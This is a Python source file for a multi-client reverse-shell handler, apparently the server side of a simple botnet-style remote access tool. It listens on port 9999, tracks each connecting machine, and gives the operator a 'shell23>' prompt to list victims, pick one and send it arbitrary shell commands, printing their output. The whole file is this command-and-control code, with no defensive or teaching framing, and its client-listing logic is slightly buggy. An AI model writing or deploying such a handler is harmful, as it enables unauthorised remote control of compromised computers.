import socket
import sys
import threading
import time
from queue import Queue

NumOfThreads = 2
JobNum = [1, 2]
queue = Queue()
all_conns = []
all_addrs = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("error occured ", msg)


def bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        print("binding on port ", str(port))
        s.listen(5)
    except socket.error as msg:
        print("error occured ", msg)


def accept_connection():
    for c in all_conns:
        c.close()
    del all_conns[:]
    del all_addrs[:]
    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)
            all_conns.append(conn)
            all_addrs.append(addr)
            print("connection estrablished from ", addr[0])
        except:
            print("error occured ")


def shell23():
    while True:
        cmd = input("shell23>")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else:
            print("command not recognized")


def list_connections():
    result = ""
    for i, conn in enumerate(all_conns):
        try:
            conn.send(str.encode("  "))
            conn.recv(20480)
        except:
            del all_conns[i]
            del all_addrs[i]
            continue
        result = str(i) + "  " + all_addrs[i][0] + "  " + str(all_addrs[i][1]) + "\n"

    print("**********CLIENT LIST**********  \n", result)


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_conns[target]
        print("connected to " + all_addrs[target][0])
        print(all_addrs[target][0] + ">", end="")
        return conn
    except:
        print("error occured")
        return None


def send_target_command(conn):
    while True:
        try:
            cmd = input()
            if cmd == "kill":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("error occured")
            break


def create_workers():
    for _ in range(NumOfThreads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind()
            accept_connection()
        if x == 2:
            shell23()

        queue.task_done()


def create_jobs():
    for x in JobNum:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()